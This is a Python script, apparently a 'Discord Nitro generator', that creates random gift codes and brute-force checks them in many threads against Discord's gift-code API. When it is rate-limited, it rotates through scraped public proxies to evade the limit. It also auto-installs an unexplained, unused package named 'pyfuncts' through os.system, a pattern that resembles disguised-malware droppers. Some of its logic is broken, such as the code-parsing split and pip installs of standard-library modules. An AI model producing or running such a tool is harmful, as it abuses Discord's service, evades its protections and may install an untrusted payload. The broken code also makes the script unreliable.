#This module does commands like titles for the window
import os
#Module overview : Getting modules to print with color, perform functions, and do requests (to validate the nitro)

#This module does requests - we can use it for scraping and using the discord api
try:
    import requests
except:
    os.system("pip install requests") 
    import requests
#This module allows threading - meaning we can do multiple tasks at once for SPEED
try:
    import threading
except:
    os.system("pip install threading")
    import threading
#This module helps efficiently get random codes (no repeats / suspicious patterns)
try:
    import pyfuncts
except:
    os.system("pip install pyfuncts") 
    import pyfuncts
#This module is used for system help
try:
    import sys
except:
    os.system("pip install sys") 
    import sys
#This module is like requests but most advanced, we can use it for the same purposes of scraping and using the api
try:
    import httpx
except:
    os.system("pip install httpx")
    import httpx
#This module is used for random - it is used to make decisions, generate codes, and adding random delays
try:
    import random
except:
    os.system("pip install random")
    import random
#This module is used to generate codes - it lets us get every character of choice (a-z,0-9) without having to type them all out
try:
    import string
except:
    os.system("pip install string")
    import string
#This module is used for colors - we can print stuff nicely
try:
    from colorama import Fore, init;init(convert = True)
except:
    os.system("pip install colorama")
    from colorama import Fore, init;init(convert = True)
#This module is used for delays - we can add a delay to stop threads overlapping, and make it easier for users to see what's going on
try:
    import time
except:
    os.system("pip install time")
    import time

def generate_code(code_length=16):
    """Generates a nitro code of 16 length (which is how long nitro codes are)"""
    characters = string.ascii_letters
    return "".join(random.choice(characters) for i in range(code_length))

def get_domain():
    """Simply discords domain for nitro - you can also change the variable to https://discord.com/gifts/ or remove the http:// bit - up to your choosing """
    return f"https://discord.gift/"

def clear():
    """Clears screen"""
    try:
        os.system("cls")
    except:
        pass

def pprint(text,color,spacing=0):
    """This lets me print stuff nicely and if I choose to change the interface I won't need to edit lots of individual print statements"""
    spacestr = spacing * " "
    print(f"{color}[{spacestr}{Fore.WHITE}{text}{color}{spacestr}]{Fore.WHITE}")

def make_title(content):
    """Titles the window"""
    os.system(f"title {content}")

rps = 0;status="Waiting";total_codes = 0
def per_second_check():
    global rps,status,total_codes
    """Calculates actions a second"""
    while True:
        if status == "Waiting for user":
            make_title(status)
        else:
            time.sleep(1)
            make_title(f"{rps} {status}, {total_codes} total")
            rps = 0


def write_code(nitro,file="nitro.txt"):
    """Used for writing down codes - can be on generation, success, retries, ratelimits etc"""
    f = open(file,"a")
    f.write(f"{nitro}\n")
    f.close()
def get_written_codes(file="nitro.txt"):
    """Used for reading the file and getting it into a list variable"""
    f = open(file)
    allcodes = f.readlines()
    codesall = []
    for code in allcodes:
        if "discord" in code:
            codesall.append(code.replace("\n",""))
            if len(codesall) % 100 == 0:
                pprint(f"{len(codesall)} nitros loaded.",Fore.CYAN,9)
                make_title(f"{len(codesall)} codes loaded")
    return codesall

def generate():
    global rps,total_codes
    """Generates nitro codes"""
    domain = get_domain()
    while True:
        code = f"{domain}{generate_code()}"
        write_code(code);rps+=1;total_codes+=1
        pprint(f"{total_codes} | {code}",Fore.CYAN)


proxies_enabled = False
proxy_list = []
def scrape_proxies(timeout="3000"):
    """Scrapes proxies off a proxyservice - the timeout variable refers to how fast they are. Lower timeout = better proxies (but less proxies!)"""
    global proxy_list
    pprint(f"Scraping proxies.",Fore.GREEN,2)
    proxy_url = f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout={timeout}&country=all&ssl=all&anonymity=all&simplified=true"
    r = requests.get(f"{proxy_url}")
    for proxy in r.text.splitlines():
        proxy_list.append(proxy)
        if len(proxy_list) % 50 == 0:
            pprint(f"Scraped {len(proxy_list)} proxies | {proxy}",Fore.GREEN)


def get_proxy():
    """Determines whether to use a proxy - this is coded so we use a proxy once our ip is ratelimited (as proxies are slow)"""
    global proxies_enabled
    global proxy_list
    if proxies_enabled == False:
        return None 
    else:
        if len(proxy_list) == 0:
            time.sleep(random.randint(2,10)/10) #stops threads overlapping and causing trouble
            if len(proxy_list) == 0:
                scrape_proxies()
        proxy = random.choice(proxy_list)
        return f"http://{proxy}"


def check_code(nitro):
    global rps,total_codes,proxies_enabled
    """Uses discord API to check code"""
    just_code = nitro.split("/")[1]
    api_url = f"https://discord.com/api/v9/entitlements/gift-codes/{just_code}?with_application=true&with_subscription_plan=true"
    try:
        r = httpx.get(f"{api_url}",proxies=get_proxy(),timeout=30)
        total_codes += 1;rps+=1
        if r.status_code == 404:
            pprint(f"{nitro} INVALID",Fore.RED)
        elif r.status_code == 429:
            pprint(f"{nitro} RATELIMITED",Fore.RED)
            write_code(nitro,"retry.txt")
            proxies_enabled = True
        elif r.status_code == 200:
            pprint(f"{nitro} VALID",Fore.GREEN)
            write_code(nitro,"valid.txt")
    except Exception as e:
        if random.randint(1,400) == 1: #don't want to spam users with this
            pprint(f"{nitro} Timeout",Fore.RED)
        write_code(nitro,"retry.txt")       


def check():
    """Checks nitro codes"""
    pprint("Max threads? (Recommended : 50)",Fore.GREEN)
    max_threads = input()
    try:
        max_threads = int(max_threads)
    except:
        max_threads = 50
    allcodes = get_written_codes()

    for nitro in allcodes:
        while threading.active_count() > max_threads:
            time.sleep(0.1)
        threading.Thread(target = check_code, args = (nitro,)).start()

def startprint():
    """Specifies printing"""
    sys.stdout = sys.__stdout__

def main():
    """Manages everything"""
    global status
    clear();startprint()
    threading.Thread(target = per_second_check).start()
    pprint(f"Please input an option..",Fore.GREEN,5)
    pprint(f"1 OR GEN to GENERATE NITRO CODES",Fore.CYAN,1)
    pprint(f"2 OR CHECK to GENERATE NITRO CODES",Fore.CYAN)
    userchoice = input().upper()
    if userchoice in ["1","GEN"]:
        status = "generated this second"
        generate()
    elif userchoice in ["2","CHECK"]:
        status = "checked this second"
        check()
    else:
        pprint("....",Fore.RED,15)
        main()


main()
input()
